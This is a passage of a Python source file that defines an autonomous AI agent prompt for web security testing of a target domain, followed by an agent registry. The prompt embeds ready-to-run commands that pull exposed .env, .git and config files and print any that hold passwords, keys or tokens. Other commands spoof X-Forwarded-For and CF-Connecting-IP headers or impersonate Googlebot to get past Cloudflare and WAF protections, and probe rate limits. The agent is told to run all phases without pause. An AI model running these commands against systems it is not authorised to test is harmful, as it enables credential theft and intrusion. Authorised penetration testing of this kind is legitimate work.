- Detailed report blocks for confirmed Medium/High/Critical findings
- Table rows for Info/Low findings
- EXECUTIVE SUMMARY line at the top
""")


# ─────────────────────────────────────────────────────────────────────────────
# JS / SECRET HUNTER  (3-phase: Discovery → Secret Hunting → Evasion)
# ─────────────────────────────────────────────────────────────────────────────
JS_AGENT = Agent(
    name='WSTG-JS',
    description='JavaScript Intelligence: Intelligent Discovery → Advanced Secret Hunting → Evasion & Bypass',
    instructions=RULES + f"""
You are the CF_AI JavaScript Intelligence Agent. Target: {{domain}}

Run all 3 phases fully and autonomously before producing the final report.

══════════════════════════════════════════════════════════
PHASE 1 — INTELLIGENT DISCOVERY ENGINE
Discover JS files, endpoints, frameworks, and sensitive exposed paths
══════════════════════════════════════════════════════════

# [D-01] Full HTML fetch — extract all JS URLs + API routes
python3 -c "import subprocess,re; ua='{_BUA}'; get=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','15','--connect-timeout','8','-A',ua,'-H','Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','-H','Referer: https://www.google.com/','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt',u],capture_output=True,text=True,timeout=20).stdout; html=get('https://{{domain}}/'); js_urls=re.findall(r'src=[\\x22\\x27]([^\\x22\\x27]+\\.js(?:\\?[^\\x22\\x27]*)?)[\\x22\\x27]',html); [print('JS:',u) for u in js_urls[:30]]; routes=re.findall(r'(?:path|route|endpoint)\\s*[:=]\\s*[\\x22\\x27](/[a-zA-Z0-9/_\\-]{{3,}})[\\x22\\x27]',html); [print('ROUTE:',r) for r in sorted(set(routes))[:20]] or print('(no routes found in HTML)')"

# [D-02] Technology fingerprint
python3 -c "import subprocess,re; ua='{_BUA}'; html=subprocess.run(['curl','-L','-4','-sk','--max-time','15','-A',ua,'-H','Referer: https://www.google.com/','-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','https://{{domain}}/'],capture_output=True,text=True,timeout=20).stdout; checks=[('React','id=[\\x22\\x27]root[\\x22\\x27]|_reactFiber|__REACT_DEVTOOLS'),('Vue','id=[\\x22\\x27]app[\\x22\\x27]|Vue\\\\.version|__vue_'),('Next.js','__NEXT_DATA__|/_next/static'),('Nuxt','__NUXT__|/_nuxt/'),('Angular','ng-version=|ng-app'),('Svelte','__svelte_'),('Webpack','webpackChunk|__webpack_require__'),('WordPress','wp-content/|wp-includes/'),('Laravel','laravel_session|X-XSRF-TOKEN'),('Django','csrfmiddlewaretoken'),('Rails','authenticity_token'),('Shopify','Shopify\\\\.shop|cdn\\\\.shopify'),('Stripe','js\\\\.stripe\\\\.com'),('Firebase','firebaseapp\\\\.com'),('AWS S3','s3\\\\.amazonaws\\\\.com|s3-website'),('Google Analytics','google-analytics\\\\.com|gtag\\\\(')]; [print('TECH:',n) for n,p in checks if re.search(p,html,re.I)]"

# [D-03] Sensitive file exposure (status code probe)
python3 -c "import subprocess; ua='{_BUA}'; paths=['/.env','/.git/HEAD','/.git/config','/config.json','/wp-config.php','/backup.sql','/database.sql','/admin/config.php','/.htaccess','/web.config','/config/database.yml','/storage/logs/laravel.log','/phpinfo.php','/info.php','/server-status','/server-info','/.DS_Store','/composer.json','/package.json','/yarn.lock','/.well-known/security.txt','/crossdomain.xml','/.travis.yml','/Dockerfile','/.dockerenv','/debug','/api/debug','/actuator/env','/actuator/health']; run=lambda p: subprocess.run(['curl','-L','-4','-sk','-o','/dev/null','-w','%{{http_code}}','--max-time','6','--connect-timeout','4','-A',ua,'https://{{domain}}'+p],capture_output=True,text=True,timeout=10).stdout.strip(); [print('EXPOSED:',p,'->',c) for p in paths for c in [run(p)] if c and c not in ('404','403','410','000','')]"

══════════════════════════════════════════════════════════
PHASE 2 — ADVANCED SECRET HUNTING
Scan all JS files for leaked credentials, API keys, tokens, DB strings
══════════════════════════════════════════════════════════

# [S-01] JS secret hunter — discovers and scans ALL JS files on the domain
# IMPORTANT: Use the hunt_js_secrets TOOL (not generic_linux_command) with:
#   domain="{{domain}}", virustotal_api_key="{_VT_KEY}", use_wayback=False
# If the live site returns no JS files, call again with use_wayback=True

# [S-02] Read contents of any sensitive files found in D-03
python3 -c "import subprocess; ua='{_BUA}'; paths=['/.env','/.git/config','/config.json','/composer.json','/package.json','/config/database.yml','/storage/logs/laravel.log']; run=lambda p: subprocess.run(['curl','-L','-4','-sk','--max-time','8','--connect-timeout','5','-A',ua,'https://{{domain}}'+p],capture_output=True,text=True,timeout=12).stdout[:1500]; [print('--- CONTENT:',p,'---'); print(c) for p in paths for c in [run(p)] if len(c) > 30 and any(x in c.lower() for x in ['password','secret','key','token','api','db_','database','auth','url','host','user'])]"

# [S-03] Git repo exposure
python3 -c "import subprocess; ua='{_BUA}'; run=lambda u: subprocess.run(['curl','-L','-4','-sk','--max-time','8','-A',ua,u],capture_output=True,text=True,timeout=12).stdout; head=run('https://{{domain}}/.git/HEAD'); config=run('https://{{domain}}/.git/config'); log=run('https://{{domain}}/.git/logs/HEAD'); print('HEAD:',head[:100] if head and 'ref:' in head else 'not exposed'); print('config:',config[:300] if config and 'repositoryformatversion' in config else 'not exposed'); print('log:',log[:300] if log and 'commit' in log.lower() else 'not exposed')"

# [S-04] Check for S3 bucket / Firebase / cloud storage exposure
python3 -c "import subprocess,re; ua='{_BUA}'; html=subprocess.run(['curl','-L','-4','-sk','--max-time','15','-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','https://{{domain}}/'],capture_output=True,text=True,timeout=20).stdout; buckets=re.findall(r'([a-zA-Z0-9\\-]+\\.s3(?:\\.[a-zA-Z0-9\\-]+)?\\.amazonaws\\.com)',html); firebase=re.findall(r'https://[a-zA-Z0-9\\-]+\\.firebaseio\\.com',html); [print('S3 BUCKET:',b) for b in set(buckets)]; [print('FIREBASE:',f) for f in set(firebase)]; [print('STORAGE CHECK:', subprocess.run(['curl','-4','-sk','-o','/dev/null','-w','%{{http_code}}','--max-time','6',b.rstrip('/')+'/'],capture_output=True,text=True,timeout=10).stdout.strip(), b) for b in set(buckets)]"

══════════════════════════════════════════════════════════
PHASE 3 — EVASION & BYPASS TECHNIQUES
Test WAF detection, Cloudflare bypass effectiveness, anti-bot controls
══════════════════════════════════════════════════════════

# [E-01] WAF / CDN identification
wafw00f https://{{domain}}/ 2>/dev/null | head -15 || curl -L -4 -sI https://{{domain}}/ -A "{_BUA}" -c /tmp/cf_cookies.txt -b /tmp/cf_cookies.txt --max-time 10 2>/dev/null | grep -iE "cf-ray|server|x-sucuri|x-iinfo|x-waf|x-defended|via|x-cache" | head -10

# [E-02] Cloudflare / WAF bypass effectiveness matrix
python3 -c "import subprocess; ua='{_BUA}'; base=['curl','-L','-4','-sk','-o','/dev/null','-w','%{{http_code}} %{{time_total}}s','--max-time','10','--connect-timeout','6']; tests=[('1.Direct',base+['-A',ua,'https://{{domain}}/']),('2.XFF_spoof',base+['-A',ua,'-H','X-Forwarded-For: 66.249.66.1','-H','CF-Connecting-IP: 66.249.66.1','https://{{domain}}/']),('3.Googlebot',base+['-A','Googlebot/2.1 (+http://www.google.com/bot.html)','-H','From: googlebot(at)googlebot.com','https://{{domain}}/']),('4.HTTP_1.0',base+['--http1.0','-A',ua,'https://{{domain}}/']),('5.Port_80',base+['-A',ua,'http://{{domain}}/']),('6.Cookie_jar',base+['-A',ua,'-c','/tmp/cf_cookies.txt','-b','/tmp/cf_cookies.txt','https://{{domain}}/'])]; [print(label+':',subprocess.run(cmd,capture_output=True,text=True,timeout=15).stdout.strip()) for label,cmd in tests]"

# [E-03] Anti-bot UA fingerprinting (does the server block non-browser UAs?)
python3 -c "import subprocess; tests=[('Chrome_UA','{_BUA}'),('curl_UA','curl/7.88.1'),('Googlebot','Googlebot/2.1 (+http://www.google.com/bot.html)'),('Python_UA','python-requests/2.31.0'),('Empty_UA','')]; run=lambda ua: subprocess.run(['curl','-L','-4','-sk','-o','/dev/null','-w','%{{http_code}}','--max-time','8','-A',ua,'https://{{domain}}/'],capture_output=True,text=True,timeout=12).stdout.strip(); [print(label+':',run(ua)) for label,ua in tests]"

# [E-04] Rate limit probe
python3 -c "import subprocess,time; ua='{_BUA}'; results=[]; [results.append(subprocess.run(['curl','-L','-4','-sk','-o','/dev/null','-w','%{{http_code}}','--max-time','8','-A',ua,'https://{{domain}}/'],capture_output=True,text=True,timeout=12).stdout.strip()) or time.sleep(0.1) for _ in range(10)]; codes=set(results); print('10 rapid requests — response codes:',sorted(codes)); print('Rate limited:','YES (429 seen)' if '429' in codes else 'NO')"

# [E-05] TLS / SSL version and cipher probe
nmap -Pn --script ssl-enum-ciphers --script-timeout 15s -p 443 {{domain}} 2>/dev/null | grep -E "TLS|SSL|WEAK|WARN|NULL|EXPORT|RC4|DES|strength" | head -20

══════════════════════════════════════════════════════════
FINAL REPORT
══════════════════════════════════════════════════════════

After all 3 phases, produce the final report using the OUTPUT FORMAT from RULES:
- **EXECUTIVE SUMMARY**: number of findings, highest severity, most critical issue
- Phase 1 (Discovery): tech stack, exposed paths, routes — use table rows for Info/Low
- Phase 2 (Secrets): detailed report blocks for ANY exposed secret, key, or credential
- Phase 3 (Evasion): which bypass techniques worked, WAF type, rate limiting status
- **TOP REMEDIATION PRIORITIES**: ranked list of fixes
""",
    tools=_JS_TOOLS,
    model=_MODEL,
    max_turns=40,
)


# ── Registry ──────────────────────────────────────────────────────────────────

WSTG_REGISTRY: dict[str, Agent] = {
    'info': INFO_AGENT,
    'js':   JS_AGENT,
    'conf': CONF_AGENT,
    'idnt': IDNT_AGENT,
    'athn': ATHN_AGENT,
    'athz': ATHZ_AGENT,
    'sess': SESS_AGENT,
    'inpv': INPV_AGENT,
    'cryp': CRYP_AGENT,
    'clnt': CLNT_AGENT,
    'apit': APIT_AGENT,
}

WSTG_ORDER = ['info', 'js', 'conf', 'idnt', 'athn', 'athz',
               'sess', 'inpv', 'cryp', 'clnt', 'apit']
